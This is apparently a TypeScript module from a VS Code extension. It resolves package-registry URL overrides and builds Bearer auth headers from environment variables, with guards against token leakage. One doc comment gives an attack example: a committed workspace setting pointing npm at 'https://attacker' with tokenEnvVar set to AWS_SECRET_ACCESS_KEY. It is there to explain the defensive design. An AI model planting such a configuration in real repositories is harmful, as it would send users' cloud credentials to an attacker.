/**
 * The pure part of `ProviderContext.registryOverride`/`registryAuthHeaders`:
 * alias resolution, trimming, the http(s)-only scheme check that stops a
 * malformed or exotic URL from reaching `fetch()` unexamined, and turning a
 * configured environment variable name into an `Authorization` header.
 *
 * Kept apart from `workspace.ts`'s `vscode.workspace.getConfiguration` read
 * so it can be unit tested directly — that file imports `vscode`, which does
 * not exist outside the editor and so cannot be loaded here at all.
 */

import type { Ecosystem } from './types.js';

/**
 * One entry in `orizzonte.registryOverrides`: a bare URL (unauthenticated,
 * the original shape), or a URL plus the name of an environment variable
 * holding a bearer token — never the token itself, which stays out of
 * settings.json and everywhere else Orizzonte's own state might land.
 */
export type RegistryOverrideValue =
  | string
  | { url: string; tokenEnvVar?: string };

function overrideFor(
  overrides: Record<string, RegistryOverrideValue>,
  ecosystem: Ecosystem,
): RegistryOverrideValue | undefined {
  // Accept both the ecosystem id and its common alias, so users can write
  // "npm" rather than having to know we call it "node" internally.
  const alias =
    ecosystem === 'node' ? 'npm' : ecosystem === 'python' ? 'pypi' : ecosystem;
  return overrides[ecosystem] ?? overrides[alias];
}

export function resolveRegistryOverride(
  overrides: Record<string, RegistryOverrideValue>,
  ecosystem: Ecosystem,
): string | undefined {
  const entry = overrideFor(overrides, ecosystem);
  if (!entry) return undefined;
  const raw = typeof entry === 'string' ? entry : entry.url;

  const trimmed = raw.trim().replace(/\/+$/, '');
  try {
    const scheme = new URL(trimmed).protocol;
    if (scheme !== 'https:' && scheme !== 'http:') return undefined;
  } catch {
    return undefined;
  }
  return trimmed;
}

/**
 * The `Authorization` header for a registry override that names an
 * environment variable, or undefined when there is nothing to send.
 *
 * `trusted` must hold only what the user configured in their own settings.
 * Workspace settings travel with the repository, and a trusted workspace is not
 * the same as a trusted `settings.json`: a committed
 * `{ "npm": { "url": "https://attacker", "tokenEnvVar": "AWS_SECRET_ACCESS_KEY" } }`
 * would otherwise send any variable in the user's environment to any host.
 * VS Code's workspace-trust gate only covers *untrusted* workspaces, so this
 * cannot rely on it.
 *
 * `effective` is the merged configuration requests actually use. The token is
 * attached only when that resolves to the very URL the user-level entry names,
 * so a workspace cannot keep the user's token and point it somewhere else.
 *
 * Deliberately re-validates the override's URL rather than trusting that a
 * caller already did: a token configured alongside a malformed or non-http(s)
 * URL must never ride along once the caller falls back to the *public*
 * registry, or a private token would leak to it.
 */
export function resolveRegistryAuthHeaders(
  trusted: Record<string, RegistryOverrideValue>,
  ecosystem: Ecosystem,
  env: NodeJS.ProcessEnv = process.env,
  effective: Record<string, RegistryOverrideValue> = trusted,
): Record<string, string> | undefined {
  const entry = overrideFor(trusted, ecosystem);
  if (typeof entry !== 'object' || !entry.tokenEnvVar) return undefined;

  const trustedUrl = resolveRegistryOverride(trusted, ecosystem);
  if (!trustedUrl) return undefined;
  if (resolveRegistryOverride(effective, ecosystem) !== trustedUrl) {
    return undefined;
  }

  const token = env[entry.tokenEnvVar]?.trim();
  if (!token) return undefined;
  return { Authorization: `Bearer ${token}` };
}
